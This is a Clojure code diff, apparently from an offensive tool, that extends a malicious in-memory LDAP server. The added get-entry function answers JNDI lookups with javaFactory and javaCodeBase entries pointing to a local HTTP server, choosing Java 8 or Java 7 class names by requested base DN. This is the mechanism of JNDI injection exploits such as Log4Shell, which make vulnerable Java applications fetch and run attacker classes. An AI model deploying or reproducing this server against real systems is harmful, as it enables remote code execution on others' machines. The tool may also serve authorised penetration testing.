@@ -18,17 +18,22 @@
     (.addAttribute "javaFactory" class-name)
     (.addAttribute "javaCodeBase" url)))
 
+(defn get-entry [app-conf base]
+  (let [url (str "http://localhost:" (:port app-conf) "/")]
+   (cond 
+     (= base (:ldap-base (:java8 app-conf))) (add-entry base url (:class-name (:java8 app-conf)))
+     (= base (:ldap-base (:java7 app-conf))) (add-entry base url (:class-name (:java7 app-conf)))
+     :else nil)))
+
 (defn create-interceptor [app-conf]
   (proxy [InMemoryOperationInterceptor]
          []
     (processSearchResult [result]
       (let [base (.getBaseDN (.getRequest result))
             _ (println "[+] LDAP request detected " base)
-            url (str "http://localhost:" (:port app-conf) "/")
-            class-name (:class-name (:java8 app-conf))
-            entry (add-entry base url class-name)
+            entry (get-entry app-conf base)
             ldap-result (new LDAPResult 0 ResultCode/SUCCESS)]
-        (if (= base (:ldap-base (:java8 app-conf)))
+        (if (some? entry)
           (do (doto result
                (.sendSearchEntry entry)
                (.setResult ldap-result))
